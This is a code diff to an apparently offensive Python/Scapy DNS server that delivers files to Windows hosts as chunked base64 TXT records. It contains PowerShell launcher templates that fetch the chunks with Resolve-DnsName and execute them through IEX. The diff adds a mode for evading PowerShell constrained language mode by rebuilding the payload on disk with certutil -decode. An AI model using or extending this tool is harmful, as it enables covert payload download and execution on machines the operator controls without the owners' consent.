@@ -55,12 +55,33 @@ def dns_handler(data):
         dns = data.getlayer(DNS)
         dnsqr = data.getlayer(DNSQR)
 
-        # only process txt queries (type 16)
-        if len(dnsqr.qname) != 0 and dnsqr.qtype == 16:
-            if args.verbose: log('Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
+        if len(dnsqr.qname) <= 0:
+            log('Received DNS query but qname was empty?', '-')
+            return
+     
+        if dnsqr.qtype == 1 or dnsqr.qtype == 28:
+            # a queries (type 1) and aaaa queries (type 28)
+            
+            if args.verbose: 
+                log('[A] Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src)) if dnsqr.qtype == 1 else log('[AAAA] Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
+ 
+            # build response packet
+            rcode = 0
+            dn = args.domain
+            t = 'A' if dnsqr.qtype == 1 else 'AAAA'
+            rdata = '127.0.0.1' if dnsqr.qtype == 1 else '::1'
+            an = (None, DNSRR(rrname=dnsqr.qname, type=t, rdata=rdata, ttl=1))[rcode == 0]
+            ns = DNSRR(rrname=dnsqr.qname, type='NS', ttl=1, rdata=args.nameserver)
+            log('Delivering %s to %s' % (rdata, ip.src), '+')
+
+            response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
+            send(response_pkt, verbose=0, iface=args.interface)
+        elif dnsqr.qtype == 16:
+            # txt queries (type 16)
+            if args.verbose: log('[TXT] Received DNS query for %s from %s' % (dnsqr.qname.decode(), ip.src))
 
             # remove domain part of fqdn and split the different parts of hostname
-            hostname = re.sub('\.%s\.$' % args.domain, '', dnsqr.qname.decode()).split('.')
+            hostname = re.sub('\.%s\.$' % args.domain, '', dnsqr.qname.decode().lower()).split('.')
 
             # check if hostname match existing file 
             if len(hostname) > 0 and hostname[0] in chunks:
@@ -69,9 +90,18 @@ def dns_handler(data):
                 if len(hostname) == 1: hostname.append('print')
 
                 # launcher response: file.stager.domain
-                if len(hostname) == 2 and hostname[1] in ['print', 'exec', 'save']:
-                    response = launcher_template % (len(stagers[hostname[0]][hostname[1]]), hostname[0], hostname[1], args.domain)
-                    log('Delivering %s %s launcher to %s' % (hostname[0], hostname[1], ip.src), '+')
+                if len(hostname) == 2 and hostname[1] in ['print', 'exec', 'save', 'clm']:
+                    if hostname[1] == 'clm':
+                        sanitized = hostname[0]
+                        filename = [key for key,value in filenames.items() if value == hostname[0]][0]
+                        tempfile = filename+".b64"
+
+                        log('Delivering %s %s stager to %s' % (hostname[0], hostname[1], ip.src), '+')
+                        #log('  %s, %s'%(filename, tempfile))
+                        response = clm_template % (len(chunks[hostname[0]]), len(chunks[hostname[0]]), hostname[0], args.domain, tempfile, tempfile, filename)
+                    else:
+                        response = launcher_template % (len(stagers[hostname[0]][hostname[1]]), hostname[0], args.domain)
+                        log('Delivering %s %s launcher to %s' % (hostname[0], hostname[1], ip.src), '+')
 
                 # stager response: file.stager.i.domain
                 elif len(hostname) == 3 and hostname[2].isdecimal() and int(hostname[2]) > 0 and int(hostname[2]) <= len(stagers[hostname[0]][hostname[1]]):
@@ -94,7 +124,10 @@ def dns_handler(data):
 
                 response_pkt = IP(id=ip.id, src=ip.dst, dst=ip.src) / UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns)
                 send(response_pkt, verbose=0, iface=args.interface)
-        
+        else:
+            # any other query
+            if args.verbose: log('[type %s] Received DNS query for %s from %s' % (dnsqr.qtype, dnsqr.qname.decode(), ip.src))
+            return
 
 if __name__ == '__main__':
     # parse args
@@ -130,6 +163,9 @@ if __name__ == '__main__':
 
     # launcher and stagers template definition
     launcher_template = 'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na "%s.%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}))))'
+
+    # Template for environments with contrained languge mode enabled
+    clm_template = '((1..%d|%%{Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Select -Exp Strings}) -join "") > %s; certutil -decode %s %s'# rm %s
 
     stager_templates = {
         'print': '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{do{$error.clear();Write-Host "[*] Resolving chunk $_/%d";Resolve-DnsName -ty TXT -na "%s.$_.%s"|Where-Object Section -eq Answer|Select -Exp Strings}until($error.count-eq0)})))',
@@ -179,5 +215,8 @@ if __name__ == '__main__':
 
     # listen for DNS query
     log('Listening for DNS queries...')
+
+    udpserver = socket. socket(socket.AF_INET, socket.SOCK_DGRAM)  
+    udpserver.bind(('0.0.0.0',53)) #listen to 53 port
 
     while True: dns_listener = sniff(filter='udp dst port 53', iface=args.interface, prn=dns_handler)
